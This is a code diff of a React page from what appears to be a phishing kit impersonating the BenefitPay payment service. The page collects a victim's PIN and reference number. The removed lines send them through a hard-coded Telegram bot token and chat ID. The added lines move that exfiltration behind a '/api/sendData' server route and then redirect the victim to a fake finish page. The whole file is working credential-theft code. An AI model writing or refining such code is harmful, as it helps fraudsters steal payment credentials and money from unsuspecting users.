@@ -36,10 +36,8 @@ function CodePageContent() {
       setExpired(true);
     }
   }, [timeLeft]);
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (expired) {
+const handleSubmit = async () => {
+  if (expired) {
       alert("The code has expired. Please request a new one.");
       return;
     }
@@ -48,21 +46,31 @@ function CodePageContent() {
 🔐 PIN: ${code}
 🔨 Ref: ${refN}
       `;
-      try {
-        await axios.post(
-          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage`,
-          {
-            chat_id: "-4836393174",
-            text: text
-          }
-        );
-        router.push(`/benefitpay/finish?refN=${refN}`);
-      } catch (error) {
-        alert("Error sending data");
-        console.error(error);
-      }
+    
+  try {
+    
+    const res = await fetch("/api/sendData", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text }),
+    });
+
+    const result = await res.json();
+    
+
+    if (result.success) {
+      router.push(`/benefitpay/finish?refN=${refN}&price=${price}`);
+    } else {
+      alert("حدث خطأ: " + result.error);
     }
-  };
+  } catch (err) {
+    
+    console.error(err);
+    alert("حدث خطأ أثناء الإرسال");
+  }
+ }
+};
+  
 
   const handleResend = async () => {
     setResending(true);
